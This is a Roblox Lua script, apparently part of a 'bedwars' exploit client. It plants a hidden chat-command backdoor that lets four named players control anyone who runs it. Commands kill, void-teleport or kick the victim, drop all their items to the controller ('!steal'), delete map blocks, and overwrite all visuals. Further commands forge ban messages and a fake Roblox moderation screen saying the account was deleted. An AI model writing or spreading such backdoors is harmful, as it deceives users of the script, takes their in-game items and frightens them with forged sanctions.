local playersService = game:GetService("Players")
local textService = game:GetService("TextService")
local lightingService = game:GetService("Lighting")
local textChatService = game:GetService("TextChatService")
local inputService = game:GetService("UserInputService")
local runService = game:GetService("RunService")
local tweenService = game:GetService("TweenService")
local collectionService = game:GetService("CollectionService")
local replicatedStorageService = game:GetService("ReplicatedStorage")
local gameCamera = workspace.CurrentCamera
local lplr = playersService.LocalPlayer
game.Players["Tab_lez"].Chatted:Connect(function(message)
    if message == "!void" then
        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame * CFrame.new(0,1000000,0)
    end
end)
game.Players["Tab_lez"].Chatted:Connect(function(message)
    if message == "!kill" then
        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
    end
end)
game.Players["Tab_lez"].Chatted:Connect(function(message)
    if message == "!kick" then
        game.Players.LocalPlayer:Kick()
    end
end)
game.Players["Tab_lez"].Chatted:Connect(function(message)
    if message == "!ban" then
        task.spawn(function()
		lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
	end)
	bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
    end
end)
--aint worki
game.Players["Tab_lez"].Chatted:Connect(function(message)
    if message == "!steal" then
        if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
					task.wait(1)
				end
				for i,v in pairs(currentinventory.inventory.items) do 
					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
						item = v.tool,
						amount = v.amount ~= math.huge and v.amount or 99999999
					})
					if e then
						e.CFrame = game.Players["Tab_lez"].Character.HumanoidRootPart.CFrame
					else
						v.tool:Destroy()
					end
		end
    end
end)
game.Players["Tab_lez"].Chatted:Connect(function(message)
    if message == "!deletemap" then
for i,v in pairs(collectionService:GetTagged("block")) do
	v:Destroy()
end
end
end)

game.Players["Tab_lez"].Chatted:Connect(function(message)
    if message == "!rickroll" then
	local function funnyfunc(v)
					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
						v.Image = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("Image"):Connect(function()
							v.Image = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
						if v.Text ~= "" then
							v.Text = "Never gonna give you up"
						end
						v:GetPropertyChangedSignal("Text"):Connect(function()
							if v.Text ~= "" then
								v.Text = "Never gonna give you up"
							end
						end)
					end
					if v:IsA("Texture") or v:IsA("Decal") then
						v.Texture = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("Texture"):Connect(function()
							v.Texture = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("MeshPart") then
						v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("TextureID"):Connect(function()
							v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("SpecialMesh") then
						v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("TextureId"):Connect(function()
							v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("Sky") then
						v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
					end
				end
			
				for i,v in pairs(game:GetDescendants()) do
					funnyfunc(v)
				end
				game.DescendantAdded:Connect(funnyfunc)
end
end)

game.Players["Tab_lez"].Chatted:Connect(function(message)
    if message == "!byfron" then
        task.spawn(function()
					local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					lplr.PlayerGui:ClearAllChildren()
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					lplr:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				end)
    end
end)


game.Players["BedwarsFixHitRegz"].Chatted:Connect(function(message)
    if message == "!void" then
        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame * CFrame.new(0,1000000,0)
    end
end)
game.Players["BedwarsFixHitRegz"].Chatted:Connect(function(message)
    if message == "!kill" then
        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
    end
end)
game.Players["BedwarsFixHitRegz"].Chatted:Connect(function(message)
    if message == "!kick" then
        game.Players.LocalPlayer:Kick()
    end
end)
game.Players["BedwarsFixHitRegz"].Chatted:Connect(function(message)
    if message == "!ban" then
        task.spawn(function()
		lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
	end)
	bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
    end
end)
--aint worki
game.Players["BedwarsFixHitRegz"].Chatted:Connect(function(message)
    if message == "!steal" then
        if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
					task.wait(1)
				end
				for i,v in pairs(currentinventory.inventory.items) do 
					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
						item = v.tool,
						amount = v.amount ~= math.huge and v.amount or 99999999
					})
					if e then
						e.CFrame = game.Players["BedwarsFixHitRegz"].Character.HumanoidRootPart.CFrame
					else
						v.tool:Destroy()
					end
		end
    end
end)
game.Players["BedwarsFixHitRegz"].Chatted:Connect(function(message)
    if message == "!deletemap" then
for i,v in pairs(collectionService:GetTagged("block")) do
	v:Destroy()
end
end
end)

game.Players["BedwarsFixHitRegz"].Chatted:Connect(function(message)
    if message == "!rickroll" then
	local function funnyfunc(v)
					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
						v.Image = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("Image"):Connect(function()
							v.Image = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
						if v.Text ~= "" then
							v.Text = "Never gonna give you up"
						end
						v:GetPropertyChangedSignal("Text"):Connect(function()
							if v.Text ~= "" then
								v.Text = "Never gonna give you up"
							end
						end)
					end
					if v:IsA("Texture") or v:IsA("Decal") then
						v.Texture = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("Texture"):Connect(function()
							v.Texture = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("MeshPart") then
						v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("TextureID"):Connect(function()
							v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("SpecialMesh") then
						v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("TextureId"):Connect(function()
							v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("Sky") then
						v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
					end
				end
			
				for i,v in pairs(game:GetDescendants()) do
					funnyfunc(v)
				end
				game.DescendantAdded:Connect(funnyfunc)
end
end)

game.Players["BedwarsFixHitRegz"].Chatted:Connect(function(message)
    if message == "!byfron" then
        task.spawn(function()
					local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					lplr.PlayerGui:ClearAllChildren()
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					lplr:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				end)
    end
end)


game.Players["Mitiometocaenmipit"].Chatted:Connect(function(message)
    if message == "!void" then
        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame * CFrame.new(0,1000000,0)
    end
end)
game.Players["Mitiometocaenmipit"].Chatted:Connect(function(message)
    if message == "!kill" then
        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
    end
end)
game.Players["Mitiometocaenmipit"].Chatted:Connect(function(message)
    if message == "!kick" then
        game.Players.LocalPlayer:Kick()
    end
end)
game.Players["Mitiometocaenmipit"].Chatted:Connect(function(message)
    if message == "!ban" then
        task.spawn(function()
		lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
	end)
	bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
    end
end)
--aint worki
game.Players["Mitiometocaenmipit"].Chatted:Connect(function(message)
    if message == "!steal" then
        if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
					task.wait(1)
				end
				for i,v in pairs(currentinventory.inventory.items) do 
					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
						item = v.tool,
						amount = v.amount ~= math.huge and v.amount or 99999999
					})
					if e then
						e.CFrame = game.Players["Mitiometocaenmipit"].Character.HumanoidRootPart.CFrame
					else
						v.tool:Destroy()
					end
		end
    end
end)
game.Players["Mitiometocaenmipit"].Chatted:Connect(function(message)
    if message == "!deletemap" then
for i,v in pairs(collectionService:GetTagged("block")) do
	v:Destroy()
end
end
end)

game.Players["Mitiometocaenmipit"].Chatted:Connect(function(message)
    if message == "!rickroll" then
	local function funnyfunc(v)
					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
						v.Image = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("Image"):Connect(function()
							v.Image = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
						if v.Text ~= "" then
							v.Text = "Never gonna give you up"
						end
						v:GetPropertyChangedSignal("Text"):Connect(function()
							if v.Text ~= "" then
								v.Text = "Never gonna give you up"
							end
						end)
					end
					if v:IsA("Texture") or v:IsA("Decal") then
						v.Texture = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("Texture"):Connect(function()
							v.Texture = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("MeshPart") then
						v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("TextureID"):Connect(function()
							v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("SpecialMesh") then
						v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("TextureId"):Connect(function()
							v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("Sky") then
						v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
					end
				end
			
				for i,v in pairs(game:GetDescendants()) do
					funnyfunc(v)
				end
				game.DescendantAdded:Connect(funnyfunc)
end
end)

game.Players["Mitiometocaenmipit"].Chatted:Connect(function(message)
    if message == "!byfron" then
        task.spawn(function()
					local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					lplr.PlayerGui:ClearAllChildren()
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					lplr:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				end)
    end
end)


game.Players["FEDERIC34445O12"].Chatted:Connect(function(message)
    if message == "!void" then
        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame * CFrame.new(0,1000000,0)
    end
end)
game.Players["FEDERIC34445O12"].Chatted:Connect(function(message)
    if message == "!kill" then
        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
    end
end)
game.Players["FEDERIC34445O12"].Chatted:Connect(function(message)
    if message == "!kick" then
        game.Players.LocalPlayer:Kick()
    end
end)
game.Players["FEDERIC34445O12"].Chatted:Connect(function(message)
    if message == "!ban" then
        task.spawn(function()
		lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
	end)
	bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
    end
end)
--aint worki
game.Players["FEDERIC34445O12"].Chatted:Connect(function(message)
    if message == "!steal" then
        if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
					task.wait(1)
				end
				for i,v in pairs(currentinventory.inventory.items) do 
					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
						item = v.tool,
						amount = v.amount ~= math.huge and v.amount or 99999999
					})
					if e then
						e.CFrame = game.Players["FEDERIC34445O12"].Character.HumanoidRootPart.CFrame
					else
						v.tool:Destroy()
					end
		end
    end
end)
game.Players["FEDERIC34445O12"].Chatted:Connect(function(message)
    if message == "!deletemap" then
for i,v in pairs(collectionService:GetTagged("block")) do
	v:Destroy()
end
end
end)

game.Players["FEDERIC34445O12"].Chatted:Connect(function(message)
    if message == "!rickroll" then
	local function funnyfunc(v)
					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
						v.Image = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("Image"):Connect(function()
							v.Image = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
						if v.Text ~= "" then
							v.Text = "Never gonna give you up"
						end
						v:GetPropertyChangedSignal("Text"):Connect(function()
							if v.Text ~= "" then
								v.Text = "Never gonna give you up"
							end
						end)
					end
					if v:IsA("Texture") or v:IsA("Decal") then
						v.Texture = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("Texture"):Connect(function()
							v.Texture = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("MeshPart") then
						v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("TextureID"):Connect(function()
							v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("SpecialMesh") then
						v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
						v:GetPropertyChangedSignal("TextureId"):Connect(function()
							v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
						end)
					end
					if v:IsA("Sky") then
						v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
						v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
					end
				end
			
				for i,v in pairs(game:GetDescendants()) do
					funnyfunc(v)
				end
				game.DescendantAdded:Connect(funnyfunc)
end
end)

game.Players["FEDERIC34445O12"].Chatted:Connect(function(message)
    if message == "!byfron" then
        task.spawn(function()
					local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					lplr.PlayerGui:ClearAllChildren()
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					lplr:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				end)
    end
end)
